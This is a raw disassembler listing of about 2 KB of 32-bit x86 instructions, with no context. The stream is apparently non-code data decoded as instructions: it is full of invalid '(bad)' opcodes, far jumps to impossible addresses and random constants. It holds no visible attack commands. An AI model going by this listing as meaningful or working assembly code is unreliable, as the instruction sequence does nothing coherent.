  4101d9:	stos   DWORD PTR es:[edi],eax
  4101da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101db:	mov    bl,0x66
  4101dd:	push   ecx
  4101de:	fst    DWORD PTR [ecx]
  4101e0:	jg     0x4101d6
  4101e2:	dec    ecx
  4101e3:	jnp    0x41021b
  4101e5:	add    DWORD PTR [ebp+0x2439c9e5],0x4
  4101ec:	repnz repz pop eax
  4101ef:	call   0x9c179cb9
  4101f4:	loopne 0x4101de
  4101f6:	or     DWORD PTR [bp-0x5883],esi
  4101fb:	mov    ch,0x4b
  4101fd:	(bad)  
  4101fe:	mov    ebp,0xa9c2c8df
  410203:	gs xor al,0xdf
  410206:	arpl   WORD PTR [eax+0x12e55087],cx
  41020c:	in     eax,dx
  41020d:	dec    ebp
  41020e:	push   ebp
  41020f:	inc    ebx
  410210:	adc    BYTE PTR es:[edx+0x11c9d842],cl
  410217:	push   ebx
  410218:	mov    edx,eax
  41021a:	retf   
  41021b:	popf   
  41021c:	nop
  41021d:	jle    0x4101d3
  41021f:	xlat   BYTE PTR ds:[ebx]
  410220:	dec    esp
  410221:	push   cs
  410222:	mov    ebp,0xaf1005c2
  410227:	push   ss
  410228:	aaa    
  410229:	jno    0x410225
  41022b:	sub    DWORD PTR [ebx+ebx*4-0x8c68abc],eax
  410232:	dec    ebp
  410233:	xlat   BYTE PTR ds:[ebx]
  410234:	imul   ecx,DWORD PTR [esi+0x43da82ac],0x7d
  41023b:	push   0xed7d7221
  410240:	adc    eax,DWORD PTR [eax+0x4b]
  410243:	mov    es,WORD PTR [esi+edx*4+0x58]
  410247:	xchg   BYTE PTR [edx+ecx*8-0x3f],ah
  41024b:	mov    ds:0xb1d9a3aa,al
  410250:	dec    ecx
  410251:	adc    eax,0xf893b7bb
  410256:	inc    ecx
  410257:	mov    ch,0x36
  410259:	out    dx,al
  41025a:	pop    ecx
  41025b:	cli    
  41025c:	shl    DWORD PTR [ebx],0x48
  41025f:	out    0xd4,eax
  410261:	jmp    0x41022e
  410263:	call   0x408ce5c6
  410268:	pop    ebx
  410269:	jno    0x4102a6
  41026b:	mov    al,0x38
  41026d:	repnz lds esp,FWORD PTR [edx+0x1986608f]
  410274:	adc    ah,ah
  410276:	loop   0x410225
  410278:	or     ebp,esp
  41027a:	sub    BYTE PTR [ebx],ch
  41027c:	add    eax,0xd5e63e71
  410281:	ret    
  410282:	dec    edx
  410283:	xlat   BYTE PTR ds:[ebx]
  410284:	push   0x2e9afc65
  410289:	dec    esi
  41028a:	loop   0x410245
  41028c:	push   ebp
  41028d:	bound  esi,QWORD PTR [ebp+0x4e]
  410290:	mov    eax,0x7f134f2d
  410295:	rcr    DWORD PTR [ecx],1
  410297:	loop   0x410232
  410299:	nop
  41029a:	sub    ecx,eax
  41029c:	and    eax,0x7125c443
  4102a1:	pop    eax
  4102a2:	add    dh,dh
  4102a4:	int3   
  4102a5:	fisttp QWORD PTR [edx]
  4102a7:	loop   0x4102fb
  4102a9:	dec    edi
  4102aa:	xor    eax,0x955bc05b
  4102af:	inc    esp
  4102b0:	sar    DWORD PTR [ebp+0x45dfa2e3],cl
  4102b6:	xchg   esp,eax
  4102b7:	ins    BYTE PTR es:[edi],dx
  4102b8:	test   eax,0xf63eae08
  4102bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102be:	and    BYTE PTR [eax+0x3e7b039f],dh
  4102c4:	mov    ah,0xdb
  4102c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c7:	lahf   
  4102c8:	push   edx
  4102c9:	push   esi
  4102ca:	out    dx,al
  4102cb:	jle    0x410275
  4102cd:	ds push ebx
  4102cf:	mov    bh,0x6b
  4102d1:	dec    ecx
  4102d2:	(bad)  
  4102d3:	push   ecx
  4102d4:	aam    0xfa
  4102d6:	push   ebx
  4102d7:	(bad)  
  4102d9:	mov    fs,WORD PTR [eax-0x9]
  4102dc:	jmp    0xeee0:0x858c3adc
  4102e3:	mov    dl,0x71
  4102e5:	jb     0x41030d
  4102e7:	mov    esp,0xc714f33a
  4102ec:	cld    
  4102ed:	ret    0x795
  4102f0:	mov    al,ds:0xaff526f
  4102f5:	fcom   st(1)
  4102f7:	inc    ebp
  4102f8:	inc    eax
  4102f9:	push   esp
  4102fa:	inc    edx
  4102fb:	es mov ebx,0x3cf26276
  410301:	cli    
  410302:	pop    edi
  410303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410304:	retf   0xc68
  410307:	adc    al,0xe0
  410309:	inc    ebp
  41030a:	rcl    DWORD PTR [edi-0x39c24984],0xd5
  410311:	(bad)  
  410312:	cmc    
  410313:	adc    eax,0x2a2dbde0
  410318:	mov    ebp,0x6f8d52cb
  41031d:	push   esp
  41031e:	test   al,0xba
  410320:	das    
  410321:	test   DWORD PTR [ecx],0xbc4382a
  410327:	hlt    
  410328:	sub    DWORD PTR [edi-0x1c],esp
  41032b:	(bad)  
  41032d:	pop    esi
  41032e:	dec    edx
  41032f:	mov    ebp,0xa67a21e
  410334:	push   cs
  410335:	xor    BYTE PTR [ecx],0x6
  410338:	and    eax,0xaaf0505b
  41033d:	repz mov ch,0x88
  410340:	jno    0x4103a1
  410342:	xchg   ecx,eax
  410343:	das    
  410344:	jae    0x4102da
  410346:	pop    ebx
  410347:	test   eax,0x3a0d0b0b
  41034c:	mov    al,0x3a
  41034e:	mov    cl,0x51
  410350:	loopne 0x410325
  410352:	add    DWORD PTR [ecx-0x66c39ba8],esi
  410358:	pop    es
  410359:	cli    
  41035a:	aad    0xd7
  41035c:	jle    0x41030c
  41035e:	push   ebp
  41035f:	sar    DWORD PTR [eax+edx*4+0x1bc88b81],1
  410366:	jmp    0x410318
  410368:	rol    DWORD PTR [edi],cl
  41036a:	loopne 0x4103d7
  41036c:	jl     0x4103a7
  41036e:	and    ecx,DWORD PTR [esi]
  410370:	(bad)  
  410371:	and    DWORD PTR [ecx],ebp
  410373:	pop    esi
  410374:	fist   WORD PTR [edi+ecx*4]
  410377:	jno    0x4103ca
  410379:	and    bh,BYTE PTR [ecx-0x9]
  41037c:	cwde   
  41037d:	mov    bh,BYTE PTR [edi-0x587ed11b]
  410383:	cmp    esp,DWORD PTR [edx-0x4a]
  410386:	das    
  410387:	shl    BYTE PTR [edx-0x64],0x26
  41038b:	test   eax,0x3c13abd1
  410390:	xor    al,0x8c
  410392:	arpl   WORD PTR [edx+ebp*4-0x78c797f],di
  410399:	ja     0x41032e
  41039b:	stc    
  41039c:	jecxz  0x410345
  41039e:	and    al,0xbc
  4103a0:	xchg   edi,eax
  4103a1:	inc    ecx
  4103a2:	ins    DWORD PTR es:[edi],dx
  4103a3:	fcom   QWORD PTR [edi]
  4103a5:	mov    dl,0x28
  4103a7:	sbb    BYTE PTR [edi+0x29],dh
  4103aa:	sbb    BYTE PTR [ebp-0x1fc82d1f],bh
  4103b0:	sub    DWORD PTR [eax],ebx
  4103b2:	push   ds
  4103b3:	stos   BYTE PTR es:[edi],al
  4103b4:	cmp    bl,bh
  4103b6:	xor    eax,0x709c625d
  4103bb:	adc    eax,DWORD PTR [esi-0xa]
  4103be:	ret    
  4103bf:	loop   0x410412
  4103c1:	ss add ebx,edx
  4103c4:	in     al,0xab
  4103c6:	fwait
  4103c7:	shl    BYTE PTR [ecx-0x13],cl
  4103ca:	shl    BYTE PTR [edx+0x21],1
  4103cd:	pushf  
  4103ce:	mov    cl,0xac
  4103d0:	push   edx
  4103d1:	aaa    
  4103d2:	mov    bh,0xc8
  4103d4:	(bad)  
  4103d5:	xor    DWORD PTR ds:0xf66116f1,esi
  4103db:	and    eax,0xd1cf6388
  4103e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103e1:	sub    BYTE PTR [edi-0x6fad8c05],ah
  4103e7:	pop    ebp
  4103e8:	call   0x1269:0x2c50e536
  4103ef:	or     al,0xdc
  4103f1:	and    DWORD PTR ds:0xfa7c17b2,esp
  4103f7:	aas    
  4103f8:	add    ebx,DWORD PTR [edx-0x7]
  4103fb:	daa    
  4103fc:	std    
  4103fd:	add    BYTE PTR [ecx],0x26
  410400:	mov    ecx,0x88287908
  410405:	ret    
  410406:	outs   dx,DWORD PTR ds:[esi]
  410407:	jmp    0x4103c1
  410409:	jmp    0x4103de
  41040b:	push   ss
  41040c:	ret    0x7605
  41040f:	jecxz  0x4103ed
  410411:	dec    ecx
  410412:	shl    esp,cl
  410414:	cmc    
  410415:	and    al,0x5
  410417:	jge    0x410424
  410419:	sub    eax,0xf6abf73a
  41041e:	pushf  
  41041f:	aaa    
  410420:	xor    cl,cl
  410422:	jp     0x4103b1
  410424:	nop
  410425:	adc    DWORD PTR [ebx+0x3c6fff80],ebp
  41042b:	jno    0x4103f2
  41042d:	call   0xf057:0x15442d4a
  410434:	enter  0xae55,0x1a
  410438:	arpl   WORD PTR [edi+eax*4],cx
  41043b:	shr    BYTE PTR [ebx],cl
  41043d:	mov    edi,0x3c742969
  410442:	add    eax,0xea1fe1b9
  410447:	mov    ch,BYTE PTR [ebp+0x5e7e44a8]
  41044d:	fnstsw WORD PTR [eax]
  41044f:	pop    ebx
  410450:	(bad)  [esi]
  410452:	ins    WORD PTR es:[edi],dx
  410454:	pop    edx
  410455:	lods   al,BYTE PTR ds:[esi]
  410456:	pop    edx
  410457:	push   esi
  410458:	inc    esp
  410459:	mov    esp,0x100fcf02
  41045e:	or     BYTE PTR [edi-0x28d96e67],cl
  410464:	loop   0x4104ab
  410466:	daa    
  410467:	mov    eax,ds:0xe1024a5b
  41046c:	xor    BYTE PTR [edx+0x74],bh
  41046f:	dec    eax
  410470:	dec    ebp
  410471:	pop    ebp
  410472:	rcr    BYTE PTR [edi],0xf6
  410475:	or     ecx,ebp
  410477:	cmp    eax,0xf83bf90a
  41047c:	xchg   ecx,eax
  41047d:	repz inc ebx
  41047f:	sub    bl,ch
  410481:	push   0xfffffffe
  410483:	ds test al,0x0
  410486:	inc    edx
  410487:	sub    esp,DWORD PTR [esi]
  410489:	call   0x8dfb:0x11fbd59
  410490:	dec    ebp
  410491:	clc    
  410492:	mov    eax,ds:0xbd5a826a
  410497:	in     al,dx
  410498:	test   DWORD PTR [eax],ecx
  41049a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049b:	mov    eax,ds:0xbe15e95
  4104a0:	pop    ebp
  4104a1:	and    BYTE PTR [ebp+eiz*8+0x692686ec],0x16
  4104a9:	jns    0x410482
  4104ab:	sbb    BYTE PTR [ecx+0x45],dh
  4104ae:	sub    al,0x95
  4104b0:	lods   eax,DWORD PTR ds:[esi]
  4104b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b2:	mov    edx,0x343e79f5
  4104b7:	js     0x410482
  4104b9:	ficom  WORD PTR [ebx-0x6c0411e7]
  4104bf:	jg     0x4104c2
  4104c1:	fcmovbe st,st(0)
  4104c3:	mov    ds:0x1cdffb56,eax
  4104c8:	sti    
  4104c9:	xor    DWORD PTR ds:0x9d39977e,edx
  4104cf:	mov    al,0xfd
  4104d1:	hlt    
  4104d2:	daa    
  4104d3:	mov    ebp,0x621ff25e
  4104d8:	cmp    dh,BYTE PTR [ebp-0x6be80de7]
  4104de:	pushf  
  4104df:	(bad)  
  4104e1:	pop    ebp
  4104e2:	call   0xa464199a
  4104e7:	sar    edx,0x2f
  4104ea:	pop    ds
  4104eb:	jnp    0x410475
  4104ed:	or     BYTE PTR [esi+ecx*2],bl
  4104f0:	push   eax
  4104f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104f2:	je     0x410485
  4104f4:	mov    ebp,0xdf8c1416
  4104f9:	xchg   ebx,eax
  4104fa:	pop    esi
  4104fb:	jo     0x41048e
  4104fd:	nop
  4104fe:	or     al,0x4b
  410500:	mov    cl,dl
  410502:	jae    0x41056a
  410504:	mov    ecx,0x39c7dc1a
  410509:	adc    ebp,DWORD PTR [ebp+0x6b]
  41050c:	ins    DWORD PTR es:[edi],dx
  41050d:	xor    al,0xa2
  41050f:	jbe    0x4104bf
  410511:	push   cs
  410512:	mov    al,ds:0x874717ed
  410517:	adc    eax,0x22e5330
  41051c:	or     eax,0x958b078b
  410521:	jmp    0x7461:0xa208591
  410528:	jmp    0x410527
  41052a:	fisttp DWORD PTR [ecx+0x3c39046c]
  410530:	cmp    eax,0xd5f9762e
  410535:	shr    al,1
  410537:	stos   BYTE PTR es:[edi],al
  410538:	fwait
  410539:	push   eax
  41053a:	fnstenv [ebx]
  41053c:	cmc    
  41053d:	scas   eax,DWORD PTR es:[edi]
  41053e:	dec    esp
  41053f:	push   cs
  410540:	jae    0x410592
  410542:	xor    DWORD PTR [edx+0x55],edx
  410545:	push   ss
  410546:	xor    eax,0x798fb04a
  41054b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054c:	add    al,0x31
  41054e:	and    BYTE PTR [eax],ch
  410550:	loope  0x410554
  410552:	arpl   WORD PTR [edi+0x4],si
  410555:	pop    edx
  410556:	scas   al,BYTE PTR es:[edi]
  410557:	inc    ebx
  410558:	(bad)  
  410559:	ror    bl,1
  41055b:	inc    edi
  41055c:	ins    DWORD PTR es:[edi],dx
  41055d:	imul   ebx,ebx,0x82dc3660
  410563:	dec    eax
  410564:	lea    esp,[edx-0x60]
  410567:	adc    bl,BYTE PTR [ecx]
  410569:	mov    cs,eax
  41056b:	mov    eax,0x6e43ba3e
  410570:	imul   esi,DWORD PTR [esi+0x3e834a90],0xffffffe1
  410577:	dec    edi
  410578:	xchg   DWORD PTR [edi-0x3e],esp
  41057b:	sub    BYTE PTR [eax+0x2c200497],cl
  410581:	xor    DWORD PTR [ebp-0x3446711c],ebp
  410587:	data16 loop 0x410576
  41058a:	cmc    
  41058b:	jle    0x4105bc
  41058d:	jp     0x4105c9
  41058f:	inc    eax
  410590:	xchg   BYTE PTR [esi+0x521d2a8],ah
  410596:	mov    esp,0x4c82c889
  41059b:	mov    esi,eax
  41059d:	ja     0x410524
  41059f:	test   DWORD PTR [ecx+eiz*2-0x6048ed34],edx
  4105a6:	mov    esi,0xc66590ae
  4105ab:	pop    edx
  4105ac:	int    0x89
  4105ae:	mov    al,ds:0xcb430877
  4105b3:	xchg   edx,eax
  4105b4:	inc    ecx
  4105b5:	icebp  
  4105b6:	push   ds
  4105b7:	iret   
  4105b8:	stos   BYTE PTR es:[edi],al
  4105b9:	mov    ds:0xb9c0009f,eax
  4105be:	xor    al,dl
  4105c0:	jbe    0x4105b8
  4105c2:	push   ss
  4105c3:	jge    0x410587
  4105c5:	xlat   BYTE PTR ds:[ebx]
  4105c6:	cmc    
  4105c7:	xchg   edx,ebx
  4105c9:	add    eax,0x1b31af5c
  4105ce:	ficom  WORD PTR [ebx]
  4105d0:	sub    ebx,DWORD PTR [edx]
  4105d2:	stos   BYTE PTR es:[edi],al
  4105d3:	jnp    0x41063d
  4105d5:	in     eax,0x79
  4105d7:	into   
  4105d8:	or     edx,ebp
  4105da:	imul   edi,DWORD PTR [edi-0x436cd552],0x2
  4105e1:	aam    0x8b
  4105e3:	loop   0x4105a0
  4105e5:	ss (bad) 
  4105e7:	(bad)  [eax]
  4105e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105ea:	pop    ebp
  4105eb:	push   eax
  4105ec:	fadd   QWORD PTR [esi]
  4105ee:	clc    
  4105ef:	leave  
  4105f0:	or     DWORD PTR [edi+0x2388019f],ecx
  4105f6:	les    esi,FWORD PTR [edi+0x18]
  4105f9:	(bad)  
  4105fa:	cld    
  4105fb:	or     cl,BYTE PTR [esi-0x6a468dd]
  410601:	popf   
  410602:	ror    BYTE PTR [edi+0x24],1
  410605:	add    DWORD PTR [edi+0x2db768a7],esp
  41060b:	pop    eax
  41060c:	pop    eax
  41060d:	hlt    
  41060e:	add    al,bl
  410610:	outs   dx,BYTE PTR ds:[esi]
  410611:	(bad)  
  410612:	cmp    al,0x21
  410614:	dec    ecx
  410615:	or     edx,edi
  410617:	mov    eax,DWORD PTR [ebp+eax*8-0x79ee25ed]
  41061e:	cmp    al,0x2e
  410620:	jb     0x410624
  410622:	adc    DWORD PTR [edx+0x1cb3198f],0xffffffb3
  410629:	test   al,0x7c
  41062b:	jnp    0x410645
  41062d:	mov    cl,0xf4
  41062f:	jmp    0x416a:0x498df835
  410636:	mov    esi,0xdccc61cb
  41063b:	xor    ch,0xe0
  41063e:	imul   esi,edi,0x46afb1a3
  410644:	xchg   DWORD PTR [edi],ecx
  410646:	inc    edi
  410647:	mov    ah,0xfb
  410649:	retf   
  41064a:	mov    ds:0xdc6f58d6,eax
  41064f:	fmul   DWORD PTR [ebp+edi*2+0x36a6de8d]
  410656:	jle    0x41068a
  410658:	das    
  410659:	outs   dx,BYTE PTR ds:[esi]
  41065a:	fwait
  41065b:	mov    ss,WORD PTR [eax-0xc57c41d]
  410661:	dec    ecx
  410662:	pushf  
  410663:	sub    al,0x7f
  410665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410666:	dec    ebp
  410667:	call   0x24d3c62c
  41066c:	loopne 0x410634
  41066e:	jmp    0xfe40d023
  410673:	adc    DWORD PTR [ecx-0x6f],ecx
  410676:	out    0x95,eax
  410678:	shr    WORD PTR [ebx+0x4c],0xb4
  41067d:	xchg   edi,eax
  41067e:	imul   ebx,DWORD PTR [eax+edi*1-0x707df405],0xf
  410686:	das    
  410687:	arpl   WORD PTR [ebp-0x28],ax
  41068a:	adc    al,0xae
  41068c:	psadbw mm7,QWORD PTR [edx]
  41068f:	lahf   
  410690:	dec    ebx
  410691:	shr    cl,0x33
  410694:	outs   dx,DWORD PTR ds:[esi]
  410695:	xchg   ebp,eax
  410696:	xchg   DWORD PTR [ebx-0x30],ecx
  410699:	inc    edi
  41069a:	aaa    
  41069b:	shl    DWORD PTR [edx-0x45],cl
  41069e:	nop
  41069f:	dec    edx
  4106a0:	call   0x5813d4c2
  4106a5:	add    al,0xa8
  4106a7:	xor    al,0x1d
  4106a9:	push   esp
  4106aa:	data16 jbe 0x41068a
  4106ad:	jmp    0x4c4c:0x6dbb489e
  4106b4:	inc    eax
  4106b5:	rol    BYTE PTR [ebx+0x7807899f],0x8c
  4106bc:	int    0xf2
  4106be:	ds mov esp,0xe70fc742
  4106c4:	daa    
  4106c5:	in     eax,dx
  4106c6:	dec    ebx
  4106c7:	pushf  
  4106c8:	test   DWORD PTR [edx-0x48eec37c],0x37663eb6
  4106d2:	cli    
  4106d3:	mov    ds:0xd3f49427,al
  4106d8:	mov    edx,0xae68a04
  4106dd:	sub    al,0x13
  4106df:	add    al,BYTE PTR [ecx+0x1a]
  4106e2:	popf   
  4106e3:	add    edi,DWORD PTR [ebx]
  4106e5:	mov    dl,0xda
  4106e7:	add    BYTE PTR [esi-0x7c],bh
  4106ea:	push   ebx
  4106eb:	pop    ds
  4106ec:	loopne 0x410676
  4106ee:	mov    edi,0x3f4c7641
  4106f3:	ror    al,1
  4106f5:	sub    BYTE PTR [ebp-0x27],dh
  4106f8:	xor    DWORD PTR [edx+0x15e2e6e4],edi
  4106fe:	inc    ebx
  4106ff:	mov    al,ds:0xe2ac0580
  410704:	loopne 0x410734
  410706:	and    eax,0xf7bd02d3
  41070b:	fwait
  41070c:	int3   
  41070d:	inc    esp
  41070e:	pop    ecx
  41070f:	mov    ah,0xde
  410711:	add    eax,0x52443a14
  410716:	in     al,dx
  410717:	mov    dh,0x5c
  410719:	mov    ds:0xb7ffc333,al
  41071e:	inc    eax
  41071f:	mov    bl,0xed
  410721:	in     al,dx
  410722:	mov    ecx,0x88ef0e84
  410727:	scas   al,BYTE PTR es:[edi]
  410728:	mov    es,WORD PTR cs:[ecx]
  41072b:	(bad)  
  41072c:	sti    
  41072d:	into   
  41072e:	(bad)  
  41072f:	jae    0x4106f9
  410731:	jb     0x41077a
  410733:	mov    ecx,0x9c7c0d2c
  410738:	popf   
  410739:	aad    0x5f
  41073b:	adc    BYTE PTR [ebp-0x13bff14f],0x2f
  410742:	adc    BYTE PTR [ecx],cl
  410744:	add    eax,0xc73f74d
  410749:	and    bh,BYTE PTR [edi+eax*8-0x7d]
  41074d:	pushf  
  41074e:	pop    es
  41074f:	lds    ecx,FWORD PTR [ecx]
  410751:	push   eax
  410752:	mov    esi,DWORD PTR [esi]
  410754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410755:	push   ss
  410756:	jge    0x4107d2
  410758:	es mov dl,0x14
  41075b:	sbb    al,0xc3
  41075d:	mov    ds:0x55428d5f,al
  410762:	sub    BYTE PTR [edi],0x6f
  410765:	ja     0x410758
  410767:	repz mov dh,BYTE PTR [ebx-0x41]
  41076b:	pop    ds
  41076c:	xchg   DWORD PTR [edx],edi
  41076e:	pop    esp
  41076f:	jae    0x4107d6
  410771:	jmp    0x60df2780
  410776:	pop    ss
  410777:	stc    
  410778:	push   edi
  410779:	cmp    BYTE PTR [ecx-0x4e],bl
  41077c:	jge    0x4107fa
  41077e:	mov    ecx,0x82e9c4ba
  410783:	ror    BYTE PTR ds:0x4731251d,cl
  410789:	mov    ah,BYTE PTR [edx]
  41078b:	cmp    edi,ecx
  41078d:	leave  
  41078e:	out    dx,eax
  41078f:	mov    ds:0x49d0f592,eax
  410794:	xchg   BYTE PTR gs:[edx+0x31482705],ah
  41079b:	mov    edx,0x8f8887
  4107a0:	jns    0x4107e8
  4107a2:	and    al,0x31
  4107a4:	mov    bl,0x33
  4107a6:	cmp    dh,dh
  4107a8:	outs   dx,DWORD PTR ds:[esi]
  4107a9:	dec    dh
  4107ab:	loope  0x410792
  4107ad:	mov    WORD PTR [ebp-0x19],ss
  4107b0:	into   
  4107b1:	inc    esp
  4107b2:	xor    cl,0x47
  4107b5:	xchg   esi,eax
  4107b6:	lds    ebx,FWORD PTR [edi-0x39]
  4107b9:	push   cs
  4107ba:	sbb    bl,BYTE PTR [ebp-0x5f]
  4107bd:	and    DWORD PTR [edi],ebp
  4107bf:	sbb    al,BYTE PTR [esi+ecx*4-0x6e6fbc18]
  4107c6:	cmp    DWORD PTR [edi+0x4c],ebp
  4107c9:	test   eax,0x66f544b
  4107ce:	xchg   DWORD PTR [ebx+0x9dc9772],eax
  4107d4:	enter  0xeee4,0x43
  4107d8:	mov    esp,0x85b5265
  4107dd:	or     ah,bl
  4107df:	sub    dl,BYTE PTR [ebx+0x6a]
  4107e2:	mov    dl,0xff
  4107e4:	(bad)  
  4107e6:	or     DWORD PTR [eax+0x24],0x63c7bd4e
  4107ed:	fdivr  st,st(5)
  4107ef:	test   eax,0x969316e3
  4107f4:	xor    eax,DWORD PTR [esi+0xdc9b07f]
  4107fa:	neg    DWORD PTR [ecx+0x5b3fba29]
  410800:	into   
  410801:	xor    cl,cl
  410803:	lods   eax,DWORD PTR ds:[esi]
  410804:	mov    ebp,esi
  410806:	shl    BYTE PTR [ecx+eax*1+0x32],cl
  41080a:	aam    0x3c
  41080c:	mov    eax,0x8ca9c881
  410811:	in     al,dx
  410812:	es stc 
  410814:	sbb    ah,BYTE PTR [edi-0x4c814145]
  41081a:	pop    esi
  41081b:	jecxz  0x41087d
  41081d:	ret    
  41081e:	test   DWORD PTR [eax-0x69],edi
  410821:	rcr    DWORD PTR [edx],1
  410823:	jp     0x410877
  410825:	or     eax,0x3181a43f
  41082a:	std    
  41082b:	cli    
  41082c:	fcmovu st,st(3)
  41082e:	add    eax,0xbdabd12b
  410833:	jmp    0xbdad3b0a
  410838:	pop    esp
  410839:	lea    edi,[ebx]
  41083b:	and    esp,ebp
  41083d:	push   ebp
  41083e:	push   eax
  410840:	inc    edi
  410841:	sbb    al,0xc9
  410843:	mov    ds:0x4e50d4c4,eax
  410848:	and    eax,0xf313a28
  41084d:	mov    dl,0xbd
  41084f:	or     DWORD PTR [esi],0x24
  410852:	ret    
  410853:	cmp    cl,BYTE PTR [ecx+0x50]
  410856:	js     0x4107ff
  410858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410859:	jns    0x41082b
  41085b:	out    0x57,eax
  41085d:	mov    eax,ds:0xe6cfeefb
  410862:	inc    ecx
  410863:	jno    0x410850
  410865:	push   0x5d
  410867:	inc    esp
  410868:	stos   BYTE PTR es:[edi],al
  410869:	bound  esp,QWORD PTR [ebx+ecx*4-0x47]
  41086d:	push   esi
  41086e:	out    dx,eax
  41086f:	hlt    
  410870:	mov    edx,0x532727c2
  410875:	fnsave [ebx+eax*2]
  410878:	mov    al,BYTE PTR [esi]
  41087a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41087b:	cmp    al,0x16
  41087d:	or     esi,DWORD PTR [eax-0x38713f31]
  410883:	fcmovnbe st,st(4)
  410885:	ret    0x4321
  410888:	add    dl,0x81
  41088b:	cmp    BYTE PTR [esp+esi*4+0x43],bl
  41088f:	pop    ds
  410890:	out    dx,eax
  410891:	push   ebx
  410892:	mov    ah,0x4e
  410894:	dec    esi
  410895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410896:	aad    0x38
  410898:	push   eax
  410899:	cld    
  41089a:	xor    ah,dh
  41089c:	adc    esp,esi
  41089e:	mov    ch,0x2e
  4108a0:	push   esp
  4108a1:	hlt    
  4108a2:	arpl   WORD PTR [edi],sp
  4108a4:	dec    edx
  4108a5:	aas    
  4108a6:	ror    DWORD PTR [edi],1
  4108a8:	bound  eax,QWORD PTR [esi-0x2f961113]
  4108ae:	inc    ecx
  4108af:	hlt    
  4108b0:	push   ecx
  4108b1:	push   eax
  4108b2:	icebp  
  4108b3:	ret    0xe61
  4108b6:	mov    al,0xd
  4108b8:	lahf   
  4108b9:	adc    eax,0x5ee354d0
  4108be:	fs xchg edi,eax
  4108c0:	ins    BYTE PTR es:[edi],dx
  4108c1:	stos   DWORD PTR es:[edi],eax
  4108c2:	cmp    ch,BYTE PTR [ebx-0x3889f492]
  4108c8:	fisub  WORD PTR [ecx]
  4108ca:	jmp    0x1a17:0xe9036b84
  4108d1:	outs   dx,BYTE PTR ds:[esi]
  4108d2:	stc    
  4108d3:	stc    
  4108d4:	jl     0x4108a2
  4108d6:	xor    ch,BYTE PTR [ecx]
  4108d8:	test   eax,eax
  4108da:	jo     0x4108ae
  4108dc:	bound  esi,QWORD PTR [edi-0x126089d1]
  4108e2:	shl    BYTE PTR [eax-0x488ca55e],cl
  4108e8:	sbb    edi,DWORD PTR [esi]
  4108ea:	push   DWORD PTR [eax]
  4108ec:	cmp    al,al
  4108ee:	call   0x13910c49
  4108f3:	lods   eax,DWORD PTR ds:[esi]
  4108f4:	xor    BYTE PTR [ebp+esi*8+0x73],0x21
  4108f9:	dec    ebx
  4108fa:	out    0x32,eax
  4108fc:	loop   0x41093a
  4108fe:	(bad)  
  4108ff:	jbe    0x410903
  410901:	je     0x4108ef
  410903:	(bad)  
  410905:	add    al,0x2a
  410907:	xchg   ebp,eax
  410908:	stc    
  410909:	imul   eax,DWORD PTR [ecx+0x316d2d8],0x3b0ca4b7
  410913:	push   edx
  410914:	ret    0x4cd5
  410917:	cmp    BYTE PTR [ebx+0x5b],bh
  41091a:	sar    DWORD PTR [esi+0x3],cl
  41091d:	dec    eax
  41091e:	or     DWORD PTR [edx+0xeb28aa],ebp
  410924:	pop    ecx
  410925:	mov    esi,0x6b70ff1d
  41092a:	pusha  
  41092b:	xor    eax,0x70acf0c1
  410930:	xor    ebp,DWORD PTR [esp+esi*2-0x57626fa6]
  410937:	xchg   edi,eax
  410938:	xchg   esi,eax
  410939:	jmp    0xf8a20750
  41093e:	cmp    esi,DWORD PTR [ebx-0x782c6cdb]
  410944:	mov    cl,0x6b
  410946:	sbb    BYTE PTR [edi+ebx*4-0x5114b965],ah
  41094d:	mov    WORD PTR [edi],?
  41094f:	cmp    al,0x5f
  410951:	rol    BYTE PTR [ebx+0x68],1
  410954:	adc    edi,DWORD PTR [ebx+0x6b]
  410957:	les    ebx,FWORD PTR [eax]
  410959:	inc    edi
  41095a:	ds ret 0xedf3
  41095e:	hlt    
  41095f:	pop    ss
  410960:	not    DWORD PTR [ecx]
  410962:	sub    eax,0xf278b0a3
  410967:	into   
  410968:	push   edx
  410969:	popa   
  41096a:	add    BYTE PTR [eax+0x3605a5ef],ah
  410970:	add    eax,ecx
  410972:	xchg   ebp,eax
  410973:	repz sbb esi,DWORD PTR ss:[eax+0x36]
  410978:	inc    eax
  410979:	push   esi
  41097a:	cmp    eax,0xeeaf2450
  41097f:	sbb    esi,ecx
  410981:	add    BYTE PTR [esi],dl
  410983:	leave  
  410984:	dec    esp
  410985:	add    esp,esi
  410987:	mov    ebp,0x9680fcbb
  41098c:	sar    esp,cl
  41098e:	xchg   edi,eax
  41098f:	pusha  
  410990:	sbb    al,0xa2
  410992:	push   es
  410993:	ins    BYTE PTR es:[edi],dx
  410994:	sar    BYTE PTR [eax+eax*8-0x47],0x2
  410999:	jp     0x4109b3
  41099b:	jns    0x4109d3
  41099d:	idiv   DWORD PTR [eax+0xb4e2910]
  4109a3:	inc    ebx
  4109a4:	add    ah,bl
  4109a6:	jns    0x410988
  4109a8:	adc    bh,bl
  4109aa:	lods   al,BYTE PTR ds:[esi]
  4109ab:	ret    
  4109ac:	pushf  
  4109ad:	cmp    BYTE PTR [esi-0x3897d1db],dl
  4109b3:	mov    cl,0xb7
  4109b5:	mov    eax,ds:0x33a7f7a5
  4109ba:	fmul   QWORD PTR [ebx+0x5]
  4109bd:	mov    ds:0x2fcc9d0b,al
  4109c2:	jns    0x410984
  4109c4:	xor    DWORD PTR [ecx-0x4b6a1609],0x33
  4109cb:	dec    eax
  4109cc:	jae    0x4109fa
  4109ce:	(bad)  
  4109cf:	mov    esp,0xd3bc7e83
  4109d4:	xchg   esi,eax
  4109d5:	mov    al,ds:0xe3c47af0
